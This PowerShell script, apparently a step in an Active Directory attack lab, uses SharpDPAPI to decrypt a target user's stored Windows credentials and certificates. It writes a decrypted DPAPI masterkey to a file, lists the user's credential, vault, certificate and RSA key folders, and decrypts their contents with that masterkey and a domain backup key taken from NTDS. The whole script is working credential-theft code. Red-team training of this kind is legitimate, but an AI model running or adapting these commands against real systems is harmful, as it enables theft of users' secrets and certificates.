# 3.5G retry - Step B: end-to-end DPAPI blob decryption with decrypted masterkey
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Tools\ADTools\CRTE-2026\SharpDPAPI.exe'
$pvk = 'C:\Tools\ADTools\ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk'
$mk  = 'C:\Tools\ADTools\wt035g-mk.txt'
$cc  = 'C:\Users\chief_command'

# record the decrypted masterkey (guid:sha1) into an mkfile for reuse
Set-Content -Path $mk -Value '{9a39e2af-9b76-474f-abad-f857dca77901}:D22A0C2C24A37DD0FDC78478CC8E383639BB6BF6' -Encoding Ascii

Write-Output '=== chief_command DPAPI-protected locations ==='
foreach ($p in @(
  "$cc\AppData\Roaming\Microsoft\Credentials",
  "$cc\AppData\Local\Microsoft\Credentials",
  "$cc\AppData\Roaming\Microsoft\Vault",
  "$cc\AppData\Local\Microsoft\Vault",
  "$cc\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates",
  "$cc\AppData\Roaming\Microsoft\Crypto\RSA"
)) {
  $n = (Get-ChildItem $p -File -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
  Write-Output "COUNT $n  $p"
}

Write-Output ''
Write-Output '=== creds /target with mkfile ==='
& $sdp creds /target:"$cc\AppData\Roaming\Microsoft\Credentials" /mkfile:$mk 2>&1 | ForEach-Object { Write-Output "CREDS|$_" }

Write-Output ''
Write-Output '=== creds /target (roaming+local) with pvk ==='
& $sdp creds /target:"$cc\AppData\Roaming\Microsoft\Credentials" /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "CREDSPVK|$_" }
& $sdp creds /target:"$cc\AppData\Local\Microsoft\Credentials" /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "CREDSLPVK|$_" }

Write-Output ''
Write-Output '=== certs with pvk ==='
& $sdp certs /target:"$cc\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates" /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "CERTS|$_" }

Write-Output 'STEP_B_DONE'
